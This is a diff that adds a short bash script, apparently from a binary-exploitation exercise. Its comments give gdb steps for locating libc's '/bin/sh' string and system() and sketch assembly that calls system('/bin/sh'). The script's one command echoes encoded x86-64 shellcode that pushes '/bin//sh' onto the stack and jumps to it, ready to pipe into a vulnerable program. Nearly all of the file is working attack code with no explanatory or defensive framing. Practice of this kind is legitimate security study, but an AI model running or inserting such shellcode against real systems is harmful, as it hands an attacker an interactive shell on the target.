@@ -1,0 +1,24 @@
+#!/bin/bash
+
+# 7ffff7b9bc19:
+# info proc map
+# find 0x7ffff7a3a000, 0x7ffff7dd5000, "/bin/sh"
+
+# 7ffff7a79480:
+# p system
+
+# push    rbp
+# mov     rbp, rsp
+# push rdi
+# movabs rdi,0xcccc7ffff7b9bc19
+# shl rdi, 16
+# shr rdi, 16
+# movabs rax,0xcccc7ffff7a79480
+# shl rax, 16
+# shr rax, 16
+# call rax
+# pop rdi
+# leave
+# ret
+
+echo -ne $'\x48\xb9\xff\xff\xff\xff\xff\xff\xff\xff\x49\xb8\xae\xb7\x72\xc3\xdb\xf0\xfa\xff\x49\x31\xc8\x41\x50\x49\xb8\xd0\x9d\x96\x91\xd0\xd0\x8c\x97\x49\x31\xc8\x41\x50\x49\xb8\xb7\xce\x2d\xad\x4f\xc4\xb7\x46\x49\x31\xc8\x41\x50\xff\xe4'
